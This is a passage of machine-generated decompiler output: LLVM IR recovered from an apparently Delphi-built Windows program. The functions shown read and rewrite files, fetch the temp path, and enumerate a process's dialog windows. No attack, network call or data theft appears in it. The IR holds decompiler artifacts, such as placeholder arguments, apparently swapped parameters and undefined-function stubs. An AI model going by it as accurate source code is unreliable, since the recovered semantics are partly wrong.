  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1683
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1684
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1685
  br i1 %7, label %dec_label_pc_406acb, label %dec_label_pc_406996, !insn.addr !1685

dec_label_pc_406996:                              ; preds = %dec_label_pc_40692c
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1683
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1686
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1686
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1687
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1688
  br i1 %12, label %dec_label_pc_406acb, label %dec_label_pc_4069b2, !insn.addr !1688

dec_label_pc_4069b2:                              ; preds = %dec_label_pc_406996
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1689
  %14 = call i32 @function_403720(), !insn.addr !1690
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1691
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1691
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1692
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1692
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1693
  %19 = call i32 @function_4046d4(), !insn.addr !1694
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406acb

dec_label_pc_406acb:                              ; preds = %dec_label_pc_4069b2, %dec_label_pc_406996, %dec_label_pc_40692c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1695
  %21 = load i32, i32* %20, align 4, !insn.addr !1695
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1696
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1697
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1697
  store i32 4221677, i32* %23, align 4, !insn.addr !1697
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1698
  ret i32 %24, !insn.addr !1699
}

define i32 @function_406ae6() local_unnamed_addr {
dec_label_pc_406ae6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1700
  ret i32 %0, !insn.addr !1700
}

define i32 @function_406aeb() local_unnamed_addr {
dec_label_pc_406aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1701
}

define i32 @function_406aed(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1702
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1702
  %3 = load i32, i32* %2, align 4, !insn.addr !1702
  ret i32 %3, !insn.addr !1703
}

define i32 @function_406b24() local_unnamed_addr {
dec_label_pc_406b24:
  %esp.2.reg2mem = alloca i32, !insn.addr !1704
  %esp.1.reg2mem = alloca i32, !insn.addr !1704
  %esi.0.reg2mem = alloca i32, !insn.addr !1704
  %esp.0.reg2mem = alloca i32, !insn.addr !1704
  %ebx.0.reg2mem = alloca i32, !insn.addr !1704
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1705
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1706
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1706
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1706
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1707
  %2 = call i32 @function_403c88(), !insn.addr !1708
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1709
  br i1 %3, label %dec_label_pc_406c0d, label %dec_label_pc_406b52, !insn.addr !1709

dec_label_pc_406b52:                              ; preds = %dec_label_pc_406b24
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1710
  %5 = call i32 @function_4036c8(), !insn.addr !1711
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1712
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1712
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1712
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1713
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1714
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1715
  br i1 %9, label %dec_label_pc_406c0d, label %dec_label_pc_406b8e, !insn.addr !1715

dec_label_pc_406b8e:                              ; preds = %dec_label_pc_406b52
  %10 = call i32 @"@LStrClr"(), !insn.addr !1716
  %11 = call i32 @function_403c90(), !insn.addr !1717
  %12 = icmp slt i32 %11, 0, !insn.addr !1718
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1719
  br i1 %12, label %dec_label_pc_406bd8, label %dec_label_pc_406ba6, !insn.addr !1719

dec_label_pc_406ba6:                              ; preds = %dec_label_pc_406b8e
  %13 = add i32 %11, 1, !insn.addr !1720
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1721
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1721
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1721
  br label %dec_label_pc_406ba9, !insn.addr !1721

dec_label_pc_406ba9:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406ba6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1722
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1722
  store i32 0, i32* %15, align 4, !insn.addr !1722
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1723
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1724
  %18 = add i32 %16, %17, !insn.addr !1724
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1724
  %20 = load i32, i32* %19, align 4, !insn.addr !1724
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1724
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1724
  store i32 %20, i32* %22, align 4, !insn.addr !1724
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1725
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1725
  store i32 ptrtoint (i32* @global_var_406c54 to i32), i32* %24, align 4, !insn.addr !1725
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1726
  %26 = or i32 %17, 4, !insn.addr !1727
  %27 = add i32 %25, %26, !insn.addr !1727
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1727
  %29 = load i32, i32* %28, align 4, !insn.addr !1727
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1727
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1727
  store i32 %29, i32* %31, align 4, !insn.addr !1727
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1728
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1728
  store i32 ptrtoint ([3 x i8]* @global_var_406c60 to i32), i32* %33, align 4, !insn.addr !1728
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1729
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1730
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1731
  %37 = icmp eq i32 %36, 0, !insn.addr !1731
  %38 = icmp eq i1 %37, false, !insn.addr !1732
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1732
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1732
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1732
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1732
  br i1 %38, label %dec_label_pc_406ba9, label %dec_label_pc_406bd8, !insn.addr !1732

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406b8e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1713
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1733
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1734
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1734
  store i32 0, i32* %42, align 4, !insn.addr !1734
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1735
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1735
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1735
  store i32 %45, i32* %44, align 4, !insn.addr !1735
  %46 = call i32 @function_4034c8(), !insn.addr !1736
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1737
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1737
  store i32 %46, i32* %48, align 4, !insn.addr !1737
  %49 = call i32 @function_403720(), !insn.addr !1738
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1739
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1739
  store i32 %49, i32* %51, align 4, !insn.addr !1739
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1740
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1740
  store i32 %39, i32* %53, align 4, !insn.addr !1740
  %54 = call i32 @function_40446c(), !insn.addr !1741
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1742
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1742
  store i32 %39, i32* %56, align 4, !insn.addr !1742
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1743
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1744
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1744
  store i32 %39, i32* %59, align 4, !insn.addr !1744
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1745
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1746
  br label %dec_label_pc_406c0d, !insn.addr !1746

dec_label_pc_406c0d:                              ; preds = %dec_label_pc_406bd8, %dec_label_pc_406b52, %dec_label_pc_406b24
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1747
  %62 = load i32, i32* %61, align 4, !insn.addr !1747
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1748
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1749
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1749
  store i32 4221999, i32* %64, align 4, !insn.addr !1749
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1750
  ret i32 %65, !insn.addr !1751
}

define i32 @function_406c28() local_unnamed_addr {
dec_label_pc_406c28:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1752
  ret i32 %0, !insn.addr !1752
}

define i32 @function_406c2d() local_unnamed_addr {
dec_label_pc_406c2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1753
}

define i32 @function_406c2f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406c2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1754
}

define i32 @function_406c64() local_unnamed_addr {
dec_label_pc_406c64:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1755
  %1 = call i32 @function_4036b8(), !insn.addr !1756
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1757
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1757
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1757
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1758
  %4 = call i32 @function_403c90(), !insn.addr !1759
  %5 = icmp slt i32 %4, 0, !insn.addr !1760
  br i1 %5, label %dec_label_pc_406cec, label %dec_label_pc_406cba, !insn.addr !1761

dec_label_pc_406cba:                              ; preds = %dec_label_pc_406c64
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1762
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1763
  br label %dec_label_pc_406d38

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406c64
  %8 = call i32 @function_403c88(), !insn.addr !1764
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1765
  %10 = call i32 @function_403c90(), !insn.addr !1766
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1767
  %12 = call i32 @function_403c90(), !insn.addr !1768
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1769
  %14 = call i32 @function_406b24(), !insn.addr !1770
  br label %dec_label_pc_406d38, !insn.addr !1770

dec_label_pc_406d38:                              ; preds = %dec_label_pc_406cba, %dec_label_pc_406cec
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1771
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1772
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1773
  ret i32 %16, !insn.addr !1774
}

define i32 @function_406d53() local_unnamed_addr {
dec_label_pc_406d53:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1775
  ret i32 %0, !insn.addr !1775
}

define i32 @function_406d58() local_unnamed_addr {
dec_label_pc_406d58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1776
}

define i32 @function_406d5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1777
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1777
  %3 = load i32, i32* %2, align 4, !insn.addr !1777
  ret i32 %3, !insn.addr !1778
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1779
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1779
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1779
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1780
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1781
  %3 = add i32 %2, 1, !insn.addr !1781
  %4 = icmp eq i32 %3, 0, !insn.addr !1781
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1781
  %5 = icmp eq i1 %4, false, !insn.addr !1782
  br i1 %5, label %dec_label_pc_406d9c, label %dec_label_pc_406d7d, !insn.addr !1782

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d64
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1783
  %7 = icmp eq i32 %6, 0, !insn.addr !1783
  br i1 %7, label %dec_label_pc_406d8c, label %dec_label_pc_406d87, !insn.addr !1784

dec_label_pc_406d87:                              ; preds = %dec_label_pc_406d7d
  %8 = call i32 @function_406b24(), !insn.addr !1785
  br label %dec_label_pc_406d8c, !insn.addr !1785

dec_label_pc_406d8c:                              ; preds = %dec_label_pc_406d87, %dec_label_pc_406d7d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1786
  br label %dec_label_pc_406d9c, !insn.addr !1786

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d8c, %dec_label_pc_406d64
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1787
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1788
  ret i32 0, !insn.addr !1789
}

define i32 @function_406daa() local_unnamed_addr {
dec_label_pc_406daa:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1790
  ret i32 %0, !insn.addr !1790
}

define i32 @function_406daf() local_unnamed_addr {
dec_label_pc_406daf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1791
}

define i32 @function_406db1(i32 %arg1) local_unnamed_addr {
dec_label_pc_406db1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1792
}

define i32 @function_406db4() local_unnamed_addr {
dec_label_pc_406db4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1793
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1793
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1793
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1794
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1795
  %3 = add i32 %2, -1, !insn.addr !1795
  %4 = icmp eq i32 %2, 0, !insn.addr !1795
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1795
  %5 = icmp eq i1 %4, false, !insn.addr !1796
  br i1 %5, label %dec_label_pc_406de8, label %dec_label_pc_406dce, !insn.addr !1796

dec_label_pc_406dce:                              ; preds = %dec_label_pc_406db4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1797
  br label %dec_label_pc_406de8, !insn.addr !1798

dec_label_pc_406de8:                              ; preds = %dec_label_pc_406dce, %dec_label_pc_406db4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1799
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1800
  ret i32 0, !insn.addr !1801
}

define i32 @function_406df6() local_unnamed_addr {
dec_label_pc_406df6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1802
  ret i32 %0, !insn.addr !1802
}

define i32 @function_406dfb() local_unnamed_addr {
dec_label_pc_406dfb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1803
}

define i32 @function_406dfd(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dfd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1804
}

define i1 @function_406e00(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406e00:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1805
  ret i1 %0, !insn.addr !1805
}

define i32 @function_406e08() local_unnamed_addr {
dec_label_pc_406e08:
  %eax.0.reg2mem = alloca i32, !insn.addr !1806
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1807
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1808
  %2 = icmp eq i32 %1, 0, !insn.addr !1809
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1810
  br i1 %2, label %dec_label_pc_406e3e, label %dec_label_pc_406e20, !insn.addr !1810

dec_label_pc_406e20:                              ; preds = %dec_label_pc_406e08
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1807
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1811
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1811
  %7 = load i8, i8* %6, align 1, !insn.addr !1811
  %8 = icmp eq i8 %7, 92, !insn.addr !1811
  br i1 %8, label %dec_label_pc_406e30, label %dec_label_pc_406e27, !insn.addr !1812

dec_label_pc_406e27:                              ; preds = %dec_label_pc_406e20
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1813
  store i8 92, i8* %9, align 1, !insn.addr !1813
  %10 = or i32 %3, 1, !insn.addr !1814
  %11 = add i32 %1, %10, !insn.addr !1814
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1814
  store i8 0, i8* %12, align 1, !insn.addr !1814
  br label %dec_label_pc_406e30, !insn.addr !1814

dec_label_pc_406e30:                              ; preds = %dec_label_pc_406e27, %dec_label_pc_406e20
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1815
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1815
  br label %dec_label_pc_406e3e, !insn.addr !1815

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e30, %dec_label_pc_406e08
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1816
}

define i32 @function_406e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e48:
  %esp.0.reg2mem = alloca i32, !insn.addr !1817
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1818
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1819
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1819
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1819
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1820
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1821
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1821
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1822
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1822
  %5 = icmp eq i1 %4, false, !insn.addr !1823
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1824
  br i1 %5, label %dec_label_pc_406eff, label %dec_label_pc_406e7f, !insn.addr !1824

dec_label_pc_406e7f:                              ; preds = %dec_label_pc_406e48
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1825
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1825
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1826
  %8 = icmp eq i32 %7, 32770, !insn.addr !1827
  %9 = icmp eq i1 %8, false, !insn.addr !1828
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1828
  br i1 %9, label %dec_label_pc_406eff, label %dec_label_pc_406e8e, !insn.addr !1828

dec_label_pc_406e8e:                              ; preds = %dec_label_pc_406e7f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1829
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1829
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1830
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1830
  %13 = add i32 %arg1, 4, !insn.addr !1831
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1831
  %15 = load i32, i32* %14, align 4, !insn.addr !1831
  %16 = icmp eq i32 %15, %12, !insn.addr !1831
  %17 = icmp eq i1 %16, false, !insn.addr !1832
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1832
  br i1 %17, label %dec_label_pc_406eff, label %dec_label_pc_406e99, !insn.addr !1832

dec_label_pc_406e99:                              ; preds = %dec_label_pc_406e8e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1833
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1833
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1834
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1835
  %21 = load i32, i32* %20, align 4, !insn.addr !1835
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1836
  %23 = icmp eq i32 %21, %22, !insn.addr !1836
  %24 = icmp eq i1 %23, false, !insn.addr !1837
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1837
  br i1 %24, label %dec_label_pc_406eff, label %dec_label_pc_406eaa, !insn.addr !1837

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e99
  %25 = add i32 %arg1, 8, !insn.addr !1838
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1838
  %27 = load i32, i32* %26, align 4, !insn.addr !1838
  %28 = icmp eq i32 %27, 0, !insn.addr !1838
  br i1 %28, label %dec_label_pc_406ed4, label %dec_label_pc_406eb0, !insn.addr !1839

dec_label_pc_406eb0:                              ; preds = %dec_label_pc_406eaa
  %29 = call i32 @function_407020(), !insn.addr !1840
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1841
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1842
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eff

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eaa
  %32 = add i32 %arg1, 12, !insn.addr !1843
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1843
  %34 = load i32, i32* %33, align 4, !insn.addr !1843
  %35 = add i32 %arg1, 16, !insn.addr !1844
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1844
  %37 = load i32, i32* %36, align 4, !insn.addr !1844
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1845
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1845
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1845
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1845
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1845
  %43 = add i32 %arg1, 24, !insn.addr !1846
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1846
  store i32 %42, i32* %44, align 4, !insn.addr !1846
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1847
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1847
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1848
  %47 = icmp eq i1 %46, false, !insn.addr !1849
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1850
  br i1 %47, label %dec_label_pc_406eff, label %dec_label_pc_406efa, !insn.addr !1850

dec_label_pc_406efa:                              ; preds = %dec_label_pc_406ed4
  %48 = add i32 %arg1, 20, !insn.addr !1851
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1851
  store i32 %arg2, i32* %49, align 4, !insn.addr !1851
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1852
  br label %dec_label_pc_406eff, !insn.addr !1852

dec_label_pc_406eff:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406efa, %dec_label_pc_406ed4, %dec_label_pc_406e99, %dec_label_pc_406e8e, %dec_label_pc_406e7f, %dec_label_pc_406e48
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1853
  %51 = load i32, i32* %50, align 4, !insn.addr !1853
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1854
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1855
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1855
  store i32 4222753, i32* %53, align 4, !insn.addr !1855
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1856
  ret i32 %54, !insn.addr !1857
}

define i32 @function_406f1a() local_unnamed_addr {
dec_label_pc_406f1a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1858
  ret i32 %0, !insn.addr !1858
}

define i32 @function_406f1f() local_unnamed_addr {
dec_label_pc_406f1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1859
}

define i32 @function_406f21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f21:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1860
}

define i32 @function_406f2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f2c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1861
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1862
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1863
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1863
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1863
  %6 = call i32 @function_40441c(), !insn.addr !1864
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1865
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1866
  br label %dec_label_pc_406f70, !insn.addr !1866

dec_label_pc_406f70:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f2c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1865
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1865
  store i32 %7, i32* %9, align 4, !insn.addr !1865
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1867
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1867
  store i32 4222536, i32* %11, align 4, !insn.addr !1867
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1868
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1869
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1869
  store i32 1, i32* %14, align 4, !insn.addr !1869
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1870
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1871
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1871
  store i32 0, i32* %16, align 4, !insn.addr !1871
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1872
